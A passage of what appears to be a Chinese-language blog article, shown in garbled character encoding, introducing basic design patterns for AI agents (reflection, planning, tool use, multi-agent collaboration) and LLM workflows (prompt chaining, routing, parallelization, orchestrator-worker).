a:hover{color:inherit;text-decoration:underline}</style><p>åœ¨åŸºäºå¤§æ¨¡å‹çš„AIåº”ç”¨è®¾è®¡ä¸Šï¼Œå­˜åœ¨ç€ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼šæ™ºèƒ½ä½“(Agent)å’Œå·¥ä½œæµ(WorkFlow)ã€‚ä¸šç•ŒæŠŠæ™ºèƒ½ä½“å’Œå·¥ä½œæµä»¥åŠå®ƒä»¬çš„æ··åˆä½“ç»Ÿç§°ä¸ºAgentic AIã€‚è®¾è®¡Agentic AIç³»ç»Ÿçš„åŸºç¡€å°±æ˜¯è®¾è®¡æ™ºèƒ½ä½“å’Œå·¥ä½œæµã€‚æœ¬æ–‡å¸¦æ‚¨å¿«é€Ÿäº†è§£æ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„åŸºç¡€è®¾è®¡æ¨¡å¼ï¼ŒæŒæ¡Agentic AIè®¾è®¡çš„æ ¸å¿ƒåŸåˆ™ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ™ºèƒ½ä½“åŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå®ç°åŠ¨æ€é€‚åº”ã€è§„åˆ’ä¸åä½œï¼Œç¡®ä¿ç³»ç»Ÿå¯ç²¾å‡†ä¸”é«˜æ•ˆåœ°å¤„ç†å¤æ‚çš„ç°å®ä»»åŠ¡ã€‚æ™ºèƒ½ä½“æœ‰å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-1">1ã€åæ€ï¼ˆReflectionï¼‰</h3>
<p>åæ€æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿä½¿æ™ºèƒ½ä½“å¯¹å…¶è¾“å‡ºç»“æœè¿›è¡Œè¿­ä»£å¼è¯„ä¼°ä¸ä¼˜åŒ–ã€‚é€šè¿‡èå…¥è‡ªæˆ‘åæ€æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯è¯†åˆ«å¹¶ä¿®æ­£é”™è¯¯ã€çŸ›ç›¾ä¹‹å¤„ä»¥åŠå¾…æ”¹è¿›çš„ç¯èŠ‚ï¼Œä»è€Œåœ¨ä»£ç ç”Ÿæˆã€æ–‡æœ¬åˆ›ä½œã€é—®ç­”ç­‰å„ç±»ä»»åŠ¡ä¸­æå‡æ‰§è¡Œæ€§èƒ½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåæ€æ¨¡å¼çš„å…·ä½“æµç¨‹æ˜¯ï¼šå…ˆä¿ƒä½¿æ™ºèƒ½ä½“ä»æ­£ç¡®æ€§ã€é£æ ¼ä¸æ•ˆç‡ä¸‰ä¸ªç»´åº¦å¯¹è‡ªèº«è¾“å‡ºç»“æœè¿›è¡Œè¯„åˆ¤ï¼Œå†å°†è¯„åˆ¤æ‰€å¾—çš„åé¦ˆä¿¡æ¯èå…¥åç»­çš„è¿­ä»£ä¼˜åŒ–è¿‡ç¨‹ã€‚å•å…ƒæµ‹è¯•ã€ç½‘ç»œæœç´¢ç­‰å¤–éƒ¨å·¥å…·å¯è¿›ä¸€æ­¥å¼ºåŒ–è¿™ä¸€æµç¨‹ â€”â€” å®ƒä»¬æ—¢èƒ½éªŒè¯è¾“å‡ºç»“æœçš„æœ‰æ•ˆæ€§ï¼Œåˆèƒ½å‡¸æ˜¾å…¶ä¸­å­˜åœ¨çš„ä¿¡æ¯ç¼ºå£ã€‚</p>
<p>åœ¨å¤šæ™ºèƒ½ä½“ç³»ç»Ÿä¸­ï¼Œåæ€æ¨¡å¼å¯é€šè¿‡è§’è‰²åˆ†å·¥çš„æ–¹å¼å®ç°ï¼šä¾‹å¦‚ç”±ä¸€ä¸ªæ™ºèƒ½ä½“è´Ÿè´£ç”Ÿæˆè¾“å‡ºå†…å®¹ï¼Œå¦ä¸€ä¸ªæ™ºèƒ½ä½“ä¸“é—¨è¿›è¡Œè¯„åˆ¤ï¼Œä»¥æ­¤æ¨åŠ¨åä½œå¼ä¼˜åŒ–ã€‚ä»¥æ³•å¾‹ç ”ç©¶åœºæ™¯ä¸ºä¾‹ï¼Œæ™ºèƒ½ä½“å¯é€šè¿‡é‡æ–°è¯„ä¼°æ£€ç´¢åˆ°çš„åˆ¤ä¾‹æ³•ï¼Œå¯¹è¾“å‡ºçš„å›å¤å†…å®¹è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€Œç¡®ä¿å›å¤çš„å‡†ç¡®æ€§ä¸å…¨é¢æ€§ã€‚åœ¨ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.17651" target="_blank" title="https://arxiv.org/pdf/2303.17651" ref="nofollow noopener noreferrer">Self-Refine</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.11366" target="_blank" title="https://arxiv.org/pdf/2303.11366" ref="nofollow noopener noreferrer">Reflexion</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2305.11738" target="_blank" title="https://arxiv.org/pdf/2305.11738" ref="nofollow noopener noreferrer">CRITIC</a>ã€‹ç­‰ç›¸å…³ç ”ç©¶ä¸­ï¼Œåæ€æ¨¡å¼å·²è¢«è¯å®èƒ½æ˜¾è‘—æå‡æ™ºèƒ½ä½“çš„ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4f0ed4a19504f64abac130d9dd674ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=SZKtT4JcGFP5E0n5dYQeCOFyVYM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>æ”¯æŒå¯¹ç»“æœè¿›è¡Œè¿­ä»£ä¼˜åŒ–ã€‚</li>
<li>æå‡å¤šæ­¥æ¨ç†ä»»åŠ¡çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨åŒ»ç–—è¯Šæ–­ç³»ç»Ÿä¸­ï¼Œæ™ºèƒ½ä½“åŸºäºæ£€ç´¢æ•°æ®çš„è¿­ä»£åé¦ˆï¼ŒæŒç»­ä¼˜åŒ–è¯Šæ–­ç»“è®ºã€‚</li>
</ul>
<h3 data-id="heading-2">2ã€è§„åˆ’ï¼ˆPlanningï¼‰</h3>
<p>è§„åˆ’æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œå®ƒèƒ½è®©æ™ºèƒ½ä½“å°†å¤æ‚ä»»åŠ¡è‡ªä¸»æ‹†è§£ä¸ºæ›´å°çš„ã€å¯å¤„ç†çš„å­ä»»åŠ¡ã€‚è¿™ç§èƒ½åŠ›å¯¹äºåŠ¨æ€ã€ä¸ç¡®å®šåœºæ™¯ä¸‹çš„å¤šæ­¥æ¨ç†ä¸è¿­ä»£å¼é—®é¢˜æ±‚è§£è‡³å…³é‡è¦ã€‚å€ŸåŠ©è§„åˆ’æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯åŠ¨æ€ç¡®å®šå®Œæˆå¤§å‹ç›®æ ‡æ‰€éœ€çš„æ­¥éª¤åºåˆ—ã€‚è¿™ç§é€‚åº”æ€§ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå¤„ç†æ— æ³•é¢„å…ˆå®šä¹‰çš„ä»»åŠ¡ï¼Œä¿éšœå†³ç­–è¿‡ç¨‹çš„çµæ´»æ€§ã€‚</p>
<p>å°½ç®¡è§„åˆ’æ¨¡å¼åŠŸèƒ½å¼ºå¤§ï¼Œä½†ä¸åæ€æ¨¡å¼è¿™ç±»ç¡®å®šæ€§å·¥ä½œæµç›¸æ¯”ï¼Œå…¶äº§å‡ºç»“æœçš„å¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚è¯¥æ¨¡å¼ç‰¹åˆ«é€‚ç”¨äºéœ€è¦åŠ¨æ€é€‚é…ã€ä¸”é¢„å®šä¹‰å·¥ä½œæµéš¾ä»¥æ»¡è¶³éœ€æ±‚çš„ä»»åŠ¡åœºæ™¯ã€‚éšç€æŠ€æœ¯æ—¥è¶‹æˆç†Ÿï¼Œå®ƒåœ¨å„é¢†åŸŸæ¨åŠ¨åˆ›æ–°åº”ç”¨çš„æ½œåŠ›å°†æŒç»­é‡Šæ”¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49930879c5ed408aa41e5e9a6d8b07f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=Hy7v4OdHyO3p%2Fx4inNTlheihIW8%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é€šè¿‡ä»»åŠ¡æ‹†è§£ï¼Œä¸ºå¤šæ­¥æ¨ç†æä¾›æ”¯æ’‘ã€‚</li>
<li>åŸºäºä¼˜åŒ–çš„ä»»åŠ¡ä¼˜å…ˆçº§æ’åºï¼Œé™ä½è®¡ç®—å¼€é”€ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æŸè´¢åŠ¡åˆ†æç³»ç»Ÿé€šè¿‡è§„åˆ’æ•°æ®æ£€ç´¢ä»»åŠ¡ï¼Œå¼€å±•é£é™©è¯„ä¼°å¹¶ç»™å‡ºå†³ç­–å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-3">3ã€å·¥å…·è°ƒç”¨ï¼ˆTool Useï¼‰</h3>
<p>å·¥å…·è°ƒç”¨æ¨¡å¼æŒ‡æ™ºèƒ½ä½“é€šè¿‡ä¸å¤–éƒ¨å·¥å…·ã€åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰æˆ–è®¡ç®—èµ„æºäº¤äº’ï¼Œæ‹“å±•è‡ªèº«èƒ½åŠ›èŒƒå›´ã€‚è¯¥æ¨¡å¼ä½¿æ™ºèƒ½ä½“å¾—ä»¥çªç ´é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œå®Œæˆä¿¡æ¯æ”¶é›†ã€è®¡ç®—æ‰§è¡Œä¸æ•°æ®å¤„ç†ç­‰ä»»åŠ¡ã€‚é€šè¿‡å°†å·¥å…·åŠ¨æ€æ•´åˆè‡³å·¥ä½œæµä¸­ï¼Œæ™ºèƒ½ä½“èƒ½å¤Ÿé€‚é…å¤æ‚ä»»åŠ¡åœºæ™¯ï¼Œè¾“å‡ºæ›´ç²¾å‡†ä¸”è´´åˆä¸Šä¸‹æ–‡çš„ç»“æœã€‚</p>
<p>åœ¨ç°ä»£æ™ºèƒ½ä½“ä¸­ï¼Œå·¥å…·è°ƒç”¨æ¨¡å¼è¢«å¹¿æ³›åº”ç”¨äºå„ç±»åœºæ™¯ï¼Œæ¶µç›–ä¿¡æ¯æ£€ç´¢ã€è®¡ç®—æ¨ç†ä»¥åŠä¸å¤–éƒ¨ç³»ç»Ÿçš„å¯¹æ¥äº¤äº’ã€‚éšç€å¤§æ¨¡å‹å·¥å…·è°ƒç”¨åŠŸèƒ½çš„è½åœ°ï¼Œä»¥åŠæ”¯æŒå¤šå·¥å…·è°ƒç”¨ç®¡ç†çš„ç³»ç»Ÿé€æ­¥æˆç†Ÿï¼Œè¯¥æ¨¡å¼çš„æŠ€æœ¯å®ç°å·²å–å¾—æ˜¾è‘—å‘å±•ã€‚è¿™äº›æŠ€æœ¯è¿›æ­¥æ¨åŠ¨äº†æ›´å¤æ‚æ™ºèƒ½ä½“çš„è½åœ° â€”â€” æ™ºèƒ½ä½“å¯é’ˆå¯¹ç‰¹å®šä»»åŠ¡è‡ªä¸»ç­›é€‰å¹¶æ‰§è¡Œæœ€é€‚é…çš„å·¥å…·ã€‚å°½ç®¡å·¥å…·è°ƒç”¨æ¨¡å¼å¤§å¹…æå‡äº†æ™ºèƒ½ä½“çš„æ•ˆèƒ½ï¼Œä½†åœ¨å·¥å…·ç­›é€‰ä¼˜åŒ–æ–¹é¢ä»å­˜åœ¨æŒ‘æˆ˜ï¼Œå°¤å…¶æ˜¯åœ¨å·¥å…·é€‰é¡¹ç¹å¤šçš„åœºæ™¯ä¸‹ã€‚ç›®å‰å·²æœ‰ç ”ç©¶æå‡ºå€Ÿé‰´æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æŠ€æœ¯çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚åŸºäºå¯å‘å¼è§„åˆ™çš„å·¥å…·ç­›é€‰æ–¹æ³•ï¼Œä»¥åº”å¯¹è¿™ä¸€éš¾é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad1ccab8d0d486db7c77f91f8e6de25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=phoLYceoJ2PF9TshQjNoUCZ87Ic%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>çªç ´ç³»ç»Ÿé¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•åŠŸèƒ½è¾¹ç•Œã€‚</li>
<li>æ•´åˆå¤–éƒ¨èµ„æºï¼Œèµ‹èƒ½ç‰¹å®šé¢†åŸŸçš„åº”ç”¨è½åœ°ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>ä¸€æ¬¾æ³•å¾‹è¾…åŠ©æ™ºèƒ½ä½“ä»åˆåŒæ•°æ®åº“ä¸­æ£€ç´¢ç›¸å…³æ¡æ¬¾ï¼Œå¹¶è¿ç”¨ç‰¹å®šé¢†åŸŸçš„è§„åˆ™å¼€å±•åˆè§„æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-4">4ã€å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-agent Collaborationï¼‰</h3>
<p>å¤šæ™ºèƒ½ä½“åä½œæ˜¯æ™ºèƒ½ä½“ç³»ç»Ÿçš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿå®ç°ä»»åŠ¡ä¸“ä¸šåŒ–åˆ†å·¥ä¸å¹¶è¡Œå¤„ç†ã€‚å„æ™ºèƒ½ä½“ä¹‹é—´é€šè¿‡é€šä¿¡å…±äº«ä¸­é—´ç»“æœï¼Œç¡®ä¿æ•´ä½“å·¥ä½œæµå§‹ç»ˆé«˜æ•ˆä¸”é€»è¾‘è¿è´¯ã€‚é€šè¿‡å°†å­ä»»åŠ¡åˆ†é…ç»™ä¸åŒçš„ä¸“ä¸šæ™ºèƒ½ä½“ï¼Œè¯¥æ¨¡å¼å¤§å¹…æå‡äº†å¤æ‚æ™ºèƒ½ä½“ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ä¸é€‚åº”æ€§ã€‚å¤šæ™ºèƒ½ä½“ç³»ç»Ÿå…è®¸å¼€å‘è€…å°†å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºæ›´å°çš„å¯å¤„ç†å­ä»»åŠ¡ï¼Œå¹¶åˆ†é…ç»™ä¸åŒæ™ºèƒ½ä½“æ‰§è¡Œã€‚è¿™ç§æ–¹å¼ä¸ä»…èƒ½æå‡ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ï¼Œè¿˜èƒ½ä¸ºç®¡ç†å¤æ‚äº¤äº’æä¾›ä¸€ä¸ªç¨³å¥çš„æ¡†æ¶ã€‚æ¯ä¸ªæ™ºèƒ½ä½“éƒ½æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ä¸å·¥ä½œæµï¼Œå…¶å·¥ä½œæµå¯æ¶µç›–å·¥å…·è°ƒç”¨ã€åæ€æˆ–è§„åˆ’æ¨¡å¼ç­‰èƒ½åŠ›æ¨¡å—ï¼Œè¿›è€Œå®ç°åŠ¨æ€åä½œå¼é—®é¢˜æ±‚è§£ã€‚</p>
<p>å°½ç®¡å¤šæ™ºèƒ½ä½“åä½œå…·å¤‡å·¨å¤§æ½œåŠ›ï¼Œä½†ç›¸è¾ƒäºåæ€æ¨¡å¼ã€å·¥å…·è°ƒç”¨ç­‰æ›´ä¸ºæˆç†Ÿçš„æ¨¡å¼ï¼Œè¯¥è®¾è®¡æ¨¡å¼çš„ç»“æœå¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚ä¸è¿‡ï¼ŒAutoGenã€Crew AIã€LangGraph ç­‰æ–°å…´æ¡†æ¶çš„å‡ºç°ï¼Œæ­£ä¸ºè½åœ°é«˜æ•ˆçš„å¤šæ™ºèƒ½ä½“è§£å†³æ–¹æ¡ˆå¼€è¾Ÿæ–°è·¯å¾„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d86bd1f280f2430e83eda0d83d7d19f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=VVXSTk3CAPJCeKmj3ej2tAUJVeU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é«˜æ•ˆå¤„ç†å¤§è§„æ¨¡åˆ†å¸ƒå¼é—®é¢˜ã€‚</li>
<li>æ•´åˆå„æ™ºèƒ½ä½“çš„ä¸“ä¸šåŒ–èƒ½åŠ›ï¼Œè¾¾æˆæ›´ä¼˜ä»»åŠ¡æˆæ•ˆã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨å®¢æœåœºæ™¯ä¸­ï¼Œå¤šä¸ªæ™ºèƒ½ä½“ååŒå·¥ä½œ â€”â€” æœ‰çš„ä»å¸¸è§é—®é¢˜è§£ç­”åº“ï¼ˆFAQsï¼‰ä¸­æ£€ç´¢çŸ¥è¯†ï¼Œæœ‰çš„ç”Ÿæˆå›å¤å†…å®¹ï¼Œæœ‰çš„è·Ÿè¿›ç”¨æˆ·åç»­éœ€æ±‚ã€‚</li>
<li>æ³•å¾‹æ™ºèƒ½è¾…åŠ©ç³»ç»Ÿ LawGlance å€ŸåŠ©å¤šæ™ºèƒ½ä½“å·¥ä½œæµç®€åŒ–æ³•å¾‹ç ”ç©¶æµç¨‹ï¼šæ™ºèƒ½ä½“åˆ†å·¥å®Œæˆç›¸å…³æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ä¿¡æ¯åˆ†æï¼Œå¹¶è¾“å‡ºç²¾å‡†çš„æ³•å¾‹æ´è§ã€‚è¯¥ç³»ç»Ÿæ•´åˆäº† Crew AIã€LangChain ä¸ Chroma å·¥å…·ï¼Œå®ç°æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ç½‘ç»œæœç´¢åŠŸèƒ½ï¼Œå¹¶é’ˆå¯¹ç”¨æˆ·çš„æŸ¥è¯¢éœ€æ±‚ç”Ÿæˆç®€æ´å‡†ç¡®çš„ç­”å¤ã€‚</li>
</ul>
<h2 data-id="heading-5">äºŒã€å·¥ä½œæµåŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>å·¥ä½œæµè®¾è®¡æ¨¡å¼ä¸ºå¼€å‘è€…æ„å»ºå‡†ç¡®ã€é«˜æ•ˆã€é«˜æ€§èƒ½çš„å¤§æ¨¡å‹åº”ç”¨æä¾›ä¼˜åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚å…·ä½“é‡‡ç”¨ä½•ç§æ–¹æ¡ˆï¼Œéœ€æ ¹æ®ä»»åŠ¡å¤æ‚åº¦ä¸å¤„ç†éœ€æ±‚è€Œå®šã€‚å·¥ä½œæµæœ‰äº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-6">1ã€æç¤ºé“¾æ¨¡å¼</h3>
<p>æç¤ºé“¾å°†ä¸€é¡¹å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªæ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤å‡åŸºäºå‰åºæ­¥éª¤çš„ç»“æœæ¨è¿›ã€‚è¿™ç§ç»“æ„åŒ–æ–¹æ³•é€šè¿‡åœ¨æ‰§è¡Œåç»­ç¯èŠ‚å‰ç®€åŒ–æ¯ä¸ªå­ä»»åŠ¡ï¼Œæœ‰æ•ˆæå‡äº†ä»»åŠ¡å¤„ç†çš„å‡†ç¡®æ€§ã€‚ä½†å—é™äºé¡ºåºå¤„ç†æœºåˆ¶ï¼Œè¯¥æ–¹æ³•å¯èƒ½ä¼šå¢åŠ ç³»ç»Ÿå»¶è¿Ÿã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a4768804f8543ffa07b927995e49e35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=8rlw9m5lF5nJFBSedaFan3Z7HK4%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>å½“æŸé¡¹ä»»åŠ¡å¯è¢«æ‹†è§£ä¸ºè‹¥å¹²å›ºå®šå­ä»»åŠ¡ï¼Œä¸”æ¯ä¸ªå­ä»»åŠ¡å‡å¯¹æœ€ç»ˆè¾“å‡ºç»“æœæœ‰æ‰€è´¡çŒ®æ—¶ï¼Œè¯¥å·¥ä½œæµçš„æ•ˆç”¨å¯å¾—åˆ°æœ€å¤§å‘æŒ¥ã€‚æ­¤æ–¹æ³•åœ¨éœ€è¦é€šè¿‡é€æ­¥æ¨ç†æå‡å‡†ç¡®æ€§çš„åœºæ™¯ä¸­å°¤ä¸ºå®ç”¨ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>å…ˆä»¥æŸä¸€ç§è¯­è¨€åˆ›ä½œè¥é”€å†…å®¹ï¼Œå†åœ¨ä¿ç•™å…¶è¯­è¨€ç²¾é«“çš„å‰æä¸‹å°†å…¶ç¿»è¯‘ä¸ºå¦ä¸€ç§è¯­è¨€ã€‚</li>
<li>æŒ‰ç»“æ„åŒ–æµç¨‹æ’°å†™æ–‡æ¡£ï¼šå…ˆç”Ÿæˆæ–‡æ¡£å¤§çº²ï¼Œæ ¸éªŒå¤§çº²çš„å®Œæ•´æ€§ï¼Œå†æ®æ­¤æ’°å†™å®Œæ•´æ–‡æœ¬ã€‚</li>
</ul>
<h3 data-id="heading-7">2ã€è·¯ç”±æ¨¡å¼</h3>
<p>è·¯ç”±æ¨¡å¼çš„æ ¸å¿ƒæ˜¯å¯¹è¾“å…¥å†…å®¹è¿›è¡Œåˆ†ç±»ï¼Œå¹¶å°†å…¶å¯¼å‘å¯¹åº”çš„ä¸“ç”¨æç¤ºè¯æˆ–å¤„ç†æµç¨‹ã€‚è¿™ç§æ–¹æ³•ç¡®ä¿ä¸åŒç±»å‹çš„æŸ¥è¯¢æˆ–ä»»åŠ¡è¢«åˆ†ç±»å¤„ç†ï¼Œä»è€Œæå‡å¤„ç†æ•ˆç‡ä¸å“åº”è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5f668643b5645608ec74ac9a9392cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=kDK13HE4V0q5YFMy72Bo5QSJnDA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä¸åŒç±»å‹è¾“å…¥éœ€è¦å·®å¼‚åŒ–å¤„ç†ç­–ç•¥çš„åœºæ™¯ï¼Œå¯ç¡®ä¿å„ç±»ä»»åŠ¡çš„å¤„ç†æ€§èƒ½è¾¾åˆ°æœ€ä¼˜ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>å°†å®¢æˆ·æœåŠ¡å’¨è¯¢åˆ†ç±»è‡³ä¸åŒæ¿å—ï¼Œå¦‚æŠ€æœ¯æ”¯æŒã€é€€æ¬¾ç”³è¯·æˆ–é€šç”¨å’¨è¯¢ã€‚</li>
<li>ä¸ºæ§åˆ¶æˆæœ¬ï¼Œå°†ç®€å•æŸ¥è¯¢åˆ†é…ç»™è½»é‡çº§æ¨¡å‹å¤„ç†ï¼Œå¤æ‚è¯·æ±‚åˆ™äº¤ç”±å…ˆè¿›æ¨¡å‹è´Ÿè´£ã€‚</li>
</ul>
<h3 data-id="heading-8">3ã€å¹¶è¡Œæ¨¡å¼</h3>
<p>å¹¶è¡Œæ¨¡å¼å°†ä¸€é¡¹ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªå¯åŒæ­¥è¿è¡Œçš„ç‹¬ç«‹å­æµç¨‹ï¼Œä»¥æ­¤é™ä½ç³»ç»Ÿå»¶è¿Ÿã€æé«˜ååé‡ã€‚è¯¥æ¨¡å¼å¯åˆ†ä¸ºä¸¤ç±»ï¼šåˆ†æ®µæ‰§è¡Œï¼ˆé¢å‘ç›¸äº’ç‹¬ç«‹çš„å­ä»»åŠ¡ï¼‰ä¸æŠ•ç¥¨æœºåˆ¶ï¼ˆé€šè¿‡å¤šä»½è¾“å‡ºç»“æœæå‡å‡†ç¡®æ€§ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a81efc1b7a044c609e32c79110e05337~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=5kl1t9ZOEAhJvMxRy8KpRhuBk7E%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä»»åŠ¡å¯æ‹†è§£ä¸ºç‹¬ç«‹æ¨¡å—ä»¥æå‡å¤„ç†é€Ÿåº¦ï¼Œæˆ–éœ€è¦é€šè¿‡å¤šä»½è¾“å‡ºç»“æœå¢å¼ºç»“è®ºå¯ä¿¡åº¦çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åˆ†æ®µæ‰§è¡Œï¼šæ‹†åˆ†å†…å®¹å®¡æ ¸ç±»ä»»åŠ¡ï¼Œç”±ä¸€ä¸ªæ¨¡å‹è´Ÿè´£è¾“å…¥å†…å®¹ç­›æŸ¥ï¼ŒåŒæ—¶ç”±å¦ä¸€ä¸ªæ¨¡å‹åŒæ­¥ç”Ÿæˆåé¦ˆç»“æœã€‚</li>
<li>æŠ•ç¥¨æœºåˆ¶ï¼šéƒ¨ç½²å¤šä¸ªæ¨¡å‹äº¤å‰æ ¡éªŒä»£ç æ¼æ´ï¼Œæˆ–å¯¹å†…å®¹å®¡æ ¸ç»“è®ºè¿›è¡Œå¤šæ¨¡å‹ä¸€è‡´æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-9">4ã€åè°ƒå™¨ - æ‰§è¡Œè€…æ¨¡å¼</h3>
<p>è¯¥è®¾è®¡æ¨¡å¼çš„æ ¸å¿ƒç‰¹å¾æ˜¯ä¸€ä¸ªä¸­å¤®åè°ƒå™¨æ¨¡å‹â€”â€” å®ƒå¯åŠ¨æ€å°†ä»»åŠ¡æ‹†è§£ä¸ºå­ä»»åŠ¡ï¼Œåˆ†é…ç»™ä¸“ä¸šåŒ–çš„æ‰§è¡Œè€…æ¨¡å‹ï¼Œå¹¶å¯¹æ‰§è¡Œç»“æœè¿›è¡Œæ±‡æ€»æ•´åˆã€‚ä¸å¹¶è¡Œå¤„ç†æ¨¡å¼ä¸åŒï¼Œè¯¥æ¨¡å¼èƒ½æ ¹æ®è¾“å…¥å†…å®¹çš„å¤æ‚ç¨‹åº¦è¿›è¡Œè‡ªé€‚åº”è°ƒæ•´ã€‚</p>
